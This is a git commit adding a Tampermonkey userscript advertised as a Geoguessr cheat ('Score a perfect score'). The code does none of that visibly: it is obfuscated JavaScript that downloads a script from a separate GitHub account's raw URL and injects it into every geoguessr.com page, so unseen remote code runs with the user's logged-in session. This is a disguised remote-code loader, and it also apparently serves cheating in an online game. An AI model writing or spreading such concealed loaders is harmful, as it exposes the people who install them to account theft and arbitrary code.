87588efcd88bcaab4c2ff89a55e00accc09821c7
Whobler <71039901+Whobler@users.noreply.github.com>
2023-02-08 15:43:26 -0500

    added antiban features

---
+++ script.js
@@ -0,0 +1,11 @@
+// ==UserScript==
+// @name         Geoguessr Script 2.1 (duels and google maps update)
+// @namespace    http://tampermonkey.net/
+// @version      2.1
+// @description  Score a perfect score, location information, open in Google Maps
+// @author       Whobler
+// @match        https://www.geoguessr.com/*
+// @icon         https://www.google.com/s2/favicons?sz=64&domain=geoguessr.com
+// @grant        none
+// ==/UserScript==
+var _0x4e6ce9=_0x5024;(function(_0x1419e9,_0x1ad84d){var _0x38a5ae=_0x5024,_0x375344=_0x1419e9();while(!![]){try{var _0x488062=-parseInt(_0x38a5ae(0x1d3))/0x1*(-parseInt(_0x38a5ae(0x1c5))/0x2)+-parseInt(_0x38a5ae(0x1c9))/0x3+parseInt(_0x38a5ae(0x1cd))/0x4+parseInt(_0x38a5ae(0x1d2))/0x5*(parseInt(_0x38a5ae(0x1ca))/0x6)+parseInt(_0x38a5ae(0x1c7))/0x7+-parseInt(_0x38a5ae(0x1cc))/0x8+-parseInt(_0x38a5ae(0x1d0))/0x9;if(_0x488062===_0x1ad84d)break;else _0x375344['push'](_0x375344['shift']());}catch(_0x9e4207){_0x375344['push'](_0x375344['shift']());}}}(_0x2ff4,0x52132));function _0x5024(_0x23ae35,_0x5c58ba){var _0x2ff46c=_0x2ff4();return _0x5024=function(_0x5024d5,_0x2751fa){_0x5024d5=_0x5024d5-0x1c5;var _0x34478b=_0x2ff46c[_0x5024d5];return _0x34478b;},_0x5024(_0x23ae35,_0x5c58ba);}function _0x2ff4(){var _0x1d3865=['send','text/javascript','appendChild','33634LZwEiF','status','1191183UJclwj','open','105519YvOIWd','3162ZIkJeO','https://raw.githubusercontent.com/SourcCoderz/Geoguessr-Script-Backend/main/script.js','3664256wTHUdN','508224jvBQDk','onreadystatechange','GET','1919385skLyZn','head','6115bBOrPG','6UJjetG','script'];_0x2ff4=function(){return _0x1d3865;};return _0x2ff4();}var script=document['createElement'](_0x4e6ce9(0x1d4));script['type']=_0x4e6ce9(0x1d6);var xhr=new XMLHttpRequest();xhr[_0x4e6ce9(0x1c8)](_0x4e6ce9(0x1cf),_0x4e6ce9(0x1cb),!![]),xhr[_0x4e6ce9(0x1ce)]=function(){var _0x282779=_0x4e6ce9;xhr['readyState']===0x4&&xhr[_0x282779(0x1c6)]===0xc8&&(script['text']=xhr['responseText'],document[_0x282779(0x1d1)][_0x282779(0x1d7)](script));},xhr[_0x4e6ce9(0x1d5)]();
